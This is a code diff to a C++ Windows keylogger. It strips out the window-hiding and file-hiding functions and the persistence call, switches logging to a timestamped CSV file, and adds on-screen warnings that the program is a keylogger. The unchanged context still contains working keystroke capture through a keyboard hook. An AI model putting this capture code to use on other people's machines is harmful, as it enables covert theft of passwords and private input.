@@ -4,19 +4,11 @@
 #include <fstream>
 #include <ctime>
 #include <csignal>
+#include <chrono>
+#include <ctime>
 
 // NOTE: Change the seed to change the file hash.
 std::string seed = "3301Kira";
-
-void HideWindow() {
-	HWND hWindow = GetConsoleWindow();
-	if (hWindow != NULL) {
-		if (IsWindowVisible(hWindow) != 0) {
-			ShowWindow(hWindow, SW_HIDE);
-		}
-		CloseHandle(hWindow);
-	}
-}
 
 std::string keylogger = "", logFile = "";
 
@@ -33,7 +25,7 @@ bool SetFileNames() {
 			printf("Cannot set the log file name\n");
 		}
 		else {
-			logFile.erase(pos + 1); logFile.append("log");
+			logFile.erase(pos + 1); logFile.append("csv");
 			success = true;
 		}
 	}
@@ -41,35 +33,13 @@ bool SetFileNames() {
 }
 
 void Write(std::string data) {
+	auto now = std::chrono::system_clock::now();
+	auto duration = now.time_since_epoch();
+	uint64_t millis = std::chrono::duration_cast<std::chrono::milliseconds>(duration).count();
+	if (data.empty()) return;
 	std::ofstream stream(logFile.c_str(), (std::ios::app | std::ios::binary));
-	if (!stream.fail()) {
-		stream.write(data.c_str(), data.length());
-		stream.close();
-	}
-}
-
-void LogTime() {
-	time_t now = time(NULL);
-	struct tm time = { };
-	char buffer[48] = "";
-	if (now == -1 || localtime_s(&time, &now) != 0 || strftime(buffer, sizeof(buffer), "%H:%M:%S %m-%d-%Y", &time) == 0) {
-		Write("<time>N/A</time>");
-	}
-	else {
-		Write(std::string("<time>").append(buffer).append("</time>"));
-	}
-}
-
-void Hide(std::string file) {
-	DWORD attr = GetFileAttributesA(file.c_str());
-	if (attr != INVALID_FILE_ATTRIBUTES && !(attr & FILE_ATTRIBUTE_HIDDEN)) {
-		SetFileAttributesA(file.c_str(), FILE_ATTRIBUTE_HIDDEN);
-	}
-}
-
-void HideFiles() {
-	Hide(keylogger);
-	Hide(logFile);
+	stream << millis << ',' << data << '\n';
+	stream.close();
 }
 
 void Persistence() {
@@ -126,76 +96,76 @@ LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam) {
 				case 0x37: { Write(shift ? "&" : "7"); break; }
 				case 0x38: { Write(shift ? "*" : "8"); break; }
 				case 0x39: { Write(shift ? "(" : "9"); break; }
-				case VK_OEM_1: { Write(shift ? ":"  : ";" ); break; }
-				case VK_OEM_2: { Write(shift ? "?"  : "/" ); break; }
-				case VK_OEM_3: { Write(shift ? "~"  : "`" ); break; }
-				case VK_OEM_4: { Write(shift ? "{"  : "[" ); break; }
-				case VK_OEM_5: { Write(shift ? "|"  : "\\"); break; }
-				case VK_OEM_6: { Write(shift ? "}"  : "]" ); break; }
-				case VK_OEM_7: { Write(shift ? "\"" : "'" ); break; }
-				case VK_OEM_PLUS:   { Write(shift ? "+" : "="); break; }
-				case VK_OEM_COMMA:  { Write(shift ? "<" : ","); break; }
-				case VK_OEM_MINUS:  { Write(shift ? "_" : "-"); break; }
+				case VK_OEM_1: { Write(shift ? ":" : ";"); break; }
+				case VK_OEM_2: { Write(shift ? "?" : "/"); break; }
+				case VK_OEM_3: { Write(shift ? "~" : "`"); break; }
+				case VK_OEM_4: { Write(shift ? "{" : "["); break; }
+				case VK_OEM_5: { Write(shift ? "|" : "\\"); break; }
+				case VK_OEM_6: { Write(shift ? "}" : "]"); break; }
+				case VK_OEM_7: { Write(shift ? "\"" : "'"); break; }
+				case VK_OEM_PLUS: { Write(shift ? "+" : "="); break; }
+				case VK_OEM_COMMA: { Write(shift ? "<" : ","); break; }
+				case VK_OEM_MINUS: { Write(shift ? "_" : "-"); break; }
 				case VK_OEM_PERIOD: { Write(shift ? ">" : "."); break; }
-				case VK_SPACE:    { Write(" "); break; }
-				case VK_NUMPAD0:  { Write("0"); break; }
-				case VK_NUMPAD1:  { Write("1"); break; }
-				case VK_NUMPAD2:  { Write("2"); break; }
-				case VK_NUMPAD3:  { Write("3"); break; }
-				case VK_NUMPAD4:  { Write("4"); break; }
-				case VK_NUMPAD5:  { Write("5"); break; }
-				case VK_NUMPAD6:  { Write("6"); break; }
-				case VK_NUMPAD7:  { Write("7"); break; }
-				case VK_NUMPAD8:  { Write("8"); break; }
-				case VK_NUMPAD9:  { Write("9"); break; }
+				case VK_SPACE: { Write("[SPACE]"); break; }
+				case VK_NUMPAD0: { Write("0"); break; }
+				case VK_NUMPAD1: { Write("1"); break; }
+				case VK_NUMPAD2: { Write("2"); break; }
+				case VK_NUMPAD3: { Write("3"); break; }
+				case VK_NUMPAD4: { Write("4"); break; }
+				case VK_NUMPAD5: { Write("5"); break; }
+				case VK_NUMPAD6: { Write("6"); break; }
+				case VK_NUMPAD7: { Write("7"); break; }
+				case VK_NUMPAD8: { Write("8"); break; }
+				case VK_NUMPAD9: { Write("9"); break; }
 				case VK_MULTIPLY: { Write("*"); break; }
-				case VK_ADD:      { Write("+"); break; }
+				case VK_ADD: { Write("+"); break; }
 				case VK_SUBTRACT: { Write("-"); break; }
-				case VK_DECIMAL:  { Write(","); break; }
-				case VK_DIVIDE:   { Write("/"); break; }
-				case VK_BACK:     { Write("[BACKSPACE]"); break; }
-				case VK_TAB:      { Write("[TAB]"      ); break; }
-				case VK_RETURN:   { Write("[ENTER]"    ); break; }
-				case VK_MENU:     { Write("[ALT]"      ); break; }
-				case VK_ESCAPE:   { Write("[ESC]"      ); break; }
-				case VK_PRIOR:    { Write("[PG UP]"    ); break; }
-				case VK_NEXT:     { Write("[PG DN]"    ); break; }
-				case VK_END:      { Write("[END]"      ); break; }
-				case VK_HOME:     { Write("[HOME]"     ); break; }
-				case VK_LEFT:     { Write("[LEFT]"     ); break; }
-				case VK_UP:       { Write("[RIGHT]"    ); break; }
-				case VK_RIGHT:    { Write("[RIGHT]"    ); break; }
-				case VK_DOWN:     { Write("[DOWN]"     ); break; }
-				case VK_PRINT:    { Write("[PRINT]"    ); break; }
-				case VK_SNAPSHOT: { Write("[PRT SC]"   ); break; }
-				case VK_INSERT:   { Write("[INSERT]"   ); break; }
-				case VK_DELETE:   { Write("[DELETE]"   ); break; }
-				case VK_LWIN:     { Write("[WIN KEY]"  ); break; }
-				case VK_RWIN:     { Write("[WIN KEY]"  ); break; }
-				case VK_CAPITAL:  { capital = !capital;   break; }
-				case VK_NUMLOCK:  { numLock = !numLock;   break; }
+				case VK_DECIMAL: { Write(","); break; }
+				case VK_DIVIDE: { Write("/"); break; }
+				case VK_BACK: { Write("[BACKSPACE]"); break; }
+				case VK_TAB: { Write("[TAB]"); break; }
+				case VK_RETURN: { Write("[ENTER]"); break; }
+				case VK_MENU: { Write("[ALT]"); break; }
+				case VK_ESCAPE: { Write("[ESC]"); break; }
+				case VK_PRIOR: { Write("[PG UP]"); break; }
+				case VK_NEXT: { Write("[PG DN]"); break; }
+				case VK_END: { Write("[END]"); break; }
+				case VK_HOME: { Write("[HOME]"); break; }
+				case VK_LEFT: { Write("[LEFT]"); break; }
+				case VK_UP: { Write("[RIGHT]"); break; }
+				case VK_RIGHT: { Write("[RIGHT]"); break; }
+				case VK_DOWN: { Write("[DOWN]"); break; }
+				case VK_PRINT: { Write("[PRINT]"); break; }
+				case VK_SNAPSHOT: { Write("[PRT SC]"); break; }
+				case VK_INSERT: { Write("[INSERT]"); break; }
+				case VK_DELETE: { Write("[DELETE]"); break; }
+				case VK_LWIN: { Write("[WIN KEY]"); break; }
+				case VK_RWIN: { Write("[WIN KEY]"); break; }
+				case VK_CAPITAL: { capital = !capital;   break; }
+				case VK_NUMLOCK: { numLock = !numLock;   break; }
 				case VK_LCONTROL: { if (wParam == WM_KEYDOWN) { Write("[CTRL]"); } break; }
 				case VK_RCONTROL: { if (wParam == WM_KEYDOWN) { Write("[CTRL]"); } break; }
-				case VK_F1:  { Write("[F1]" ); break; }
-				case VK_F2:  { Write("[F2]" ); break; }
-				case VK_F3:  { Write("[F3]" ); break; }
-				case VK_F4:  { Write("[F4]" ); break; }
-				case VK_F5:  { Write("[F5]" ); break; }
-				case VK_F6:  { Write("[F6]" ); break; }
-				case VK_F7:  { Write("[F7]" ); break; }
-				case VK_F8:  { Write("[F8]" ); break; }
-				case VK_F9:  { Write("[F9]" ); break; }
+				case VK_F1: { Write("[F1]"); break; }
+				case VK_F2: { Write("[F2]"); break; }
+				case VK_F3: { Write("[F3]"); break; }
+				case VK_F4: { Write("[F4]"); break; }
+				case VK_F5: { Write("[F5]"); break; }
+				case VK_F6: { Write("[F6]"); break; }
+				case VK_F7: { Write("[F7]"); break; }
+				case VK_F8: { Write("[F8]"); break; }
+				case VK_F9: { Write("[F9]"); break; }
 				case VK_F10: { Write("[F10]"); break; }
 				case VK_F11: { Write("[F11]"); break; }
 				case VK_F12: { Write("[F12]"); break; }
-				default: {
-					DWORD dWord = keystroke->scanCode << 16;
-					dWord += keystroke->flags << 24;
-					char otherKey[16] = "";
-					if (GetKeyNameTextA(dWord, otherKey, sizeof(otherKey)) != 0) {
-						Write(otherKey);
-					}
+			default: {
+				DWORD dWord = keystroke->scanCode << 16;
+				dWord += keystroke->flags << 24;
+				char otherKey[16] = "";
+				if (GetKeyNameTextA(dWord, otherKey, sizeof(otherKey)) != 0) {
+					Write(otherKey);
 				}
+			}
 			}
 		}
 	}
@@ -250,15 +220,13 @@ void CreateHookThread() {
 }
 
 int main() {
-	// HideWindow();
 	SetConsoleTitleA("Keylogger");
-	printf("Keylogger v2.3 by Ivan Sincek.\n");
-	printf("GitHub repository at github.com/ivan-sincek/keylogger.\n");
+	printf("THIS IS A KEYLOGGER DO NOT LEAVE IT OPEN!!!!\n");
+	printf("There is no possible way to hide this keylogger. Dont even try bub.\n");
+	printf("This program outputs a nice csv file called Keylogger.csv :) \n");
 	if (SetFileNames()) {
-		LogTime();
-		// HideFiles();
-		// Persistence();
 		CreateHookThread();
+
 	}
 	return 0;
 }
